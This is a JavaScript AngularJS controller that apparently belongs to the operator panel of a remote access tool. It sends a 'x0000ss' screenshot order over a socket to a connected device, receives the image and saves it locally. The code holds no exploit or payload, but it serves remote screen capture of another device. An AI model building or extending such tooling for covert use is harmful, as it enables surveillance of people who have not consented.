
// ==================== SCREENSHOT CONTROLLER ====================
app.controller("ScreenshotCtrl", function ($scope, $rootScope) {
    $screenshotCtrl = $scope;
    $screenshotCtrl.screenshots = [];

    // Auto-load existing screenshots if any (mockup for now)
    // In real app, we might scan the downloads folder

    $screenshotCtrl.takeScreenshot = () => {
        $rootScope.Log('Sending screenshot command...', CONSTANTS.logStatus.DEFAULT);
        socket.emit(ORDER, { order: 'x0000ss' });
    };

    $screenshotCtrl.clearScreenshots = () => {
        $screenshotCtrl.screenshots = [];
    };

    $screenshotCtrl.saveScreenshot = (shot) => {
        var base64Data = shot.url.replace(/^data:image\/jpeg;base64,/, "");
        var fileName = "Screenshot_" + shot.app + "_" + Date.now() + ".jpg";
        var filePath = path.join(downloadsPath, fileName);

        fs.outputFile(filePath, base64Data, 'base64', (err) => {
            if (err)
                $rootScope.Log("Save failed: " + err, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Saved to " + filePath, CONSTANTS.logStatus.SUCCESS);
        });
    };

    // Listen for screenshot data
    // Note: socket.on listener might duplicate if controller reloads. 
    // Ideally we should removeListener on destroy, but simplistic here.
    var ssHandler = (data) => {
        if (data.screenshot) {
            $rootScope.Log('Screenshot received from ' + (data.app || 'Unknown'), CONSTANTS.logStatus.SUCCESS);

            // Convert buffer to base64
            var binary = '';
            var bytes = new Uint8Array(data.buffer);
            var len = bytes.byteLength;
            for (var i = 0; i < len; i++) {
                binary += String.fromCharCode(bytes[i]);
            }
            var base64 = window.btoa(binary);

            $screenshotCtrl.screenshots.unshift({
                url: 'data:image/jpeg;base64,' + base64,
                app: data.app || 'Active App',
                time: new Date(data.timestamp || Date.now()).toLocaleTimeString()
            });
            $screenshotCtrl.$apply();
        }
    };

    // Prevent duplicate listeners
    socket.off('x0000ss');
    socket.on('x0000ss', ssHandler);

    $scope.$on('$destroy', function () {
        socket.off('x0000ss', ssHandler);
    });
});
